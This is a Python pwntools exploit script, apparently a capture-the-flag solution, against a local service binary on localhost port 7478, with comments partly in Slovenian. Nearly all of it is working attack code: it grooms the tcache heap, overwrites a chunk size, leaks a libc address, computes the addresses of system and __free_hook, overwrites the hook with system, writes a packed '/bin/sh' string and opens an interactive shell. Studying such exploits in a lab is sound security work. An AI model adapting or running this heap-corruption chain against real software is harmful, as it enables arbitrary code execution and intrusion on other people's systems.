from pwn import *
from time import sleep
#p = process("./cev")
p = remote('localhost', 7478)

#pid = gdb.attach(p,gdbscript='b * answer+550')


#raw_input()
p.sendline(str(10))

def do_sodo(q,n,overwrite,what):

    p.sendline(str(n))
    p.sendline(str(q))

    for j in range(n):
        p.sendline(str(what))
    if q > 0:
        p.sendline(b'1') # t
        p.sendline(b'0') # x
        p.sendline(str(overwrite)) # y



def do_liho(q,n,what):
    p.sendline(str(n))
    p.sendline(str(q))

    for _ in range(n):
        p.sendline(str(what))
    if q > 0:
        p.sendline(b'0') #t
        p.sendline(b'2') #x
#raw_input()
do_sodo(0,258,0x0,0x0) # main_area_addr na heap -> 2 chunka v tcache
do_sodo(1,1,0x131,0x0) # sprazni tcache part1
do_sodo(1,1,0x131+0x110+0x20,0x0) # sprazni tcache part2 overwrite size (potegni iz 0x21, daj v 0x401)
do_liho(1,1,0x0) #dobi leak i hope 
do_sodo(0,240,0x0,0x0)
do_sodo(1,1,0x91,0x0)
do_sodo(1,1,0x91,0x0)

leak = int(p.recvline())
print("leak_libc: ",hex(leak))
libc_base = leak -0x1bebe0
print("libc_base: ", hex(libc_base))
system = libc_base +0x48e50
_free_hook = libc_base +0x1c1e70


rebuild_heap = [0x0,0x0,0x0,0x21,_free_hook-8,0x0,0x0,0x410,0x0]

rebuild_heap += [0x0] * (0xb - len(rebuild_heap))
#raw_input()
p.sendline(str(0xb))
p.sendline(str(1))
#raw_input()
for _ in rebuild_heap:
    p.sendline(str(_))

p.sendline(b'1') # t
p.sendline(b'0') # x
p.sendline(str(0x41)) # y
#raw_input()
#sleep(5)
do_sodo(0,0xb,0x41,0x21)
#raw_input()
#sleep(5)
p.sendline(str(0xe))
p.sendline(str(0))
#raw_input()
print("A");
f = [0x0068732f6e69622f,system]
f += [0x0,0x1,0x2,0x3,0x4,0x5,0x6] 

for i in f:
    p.sendline(str(i))
print("B")

sleep(1)
#p.sendline('ls')
p.interactive()


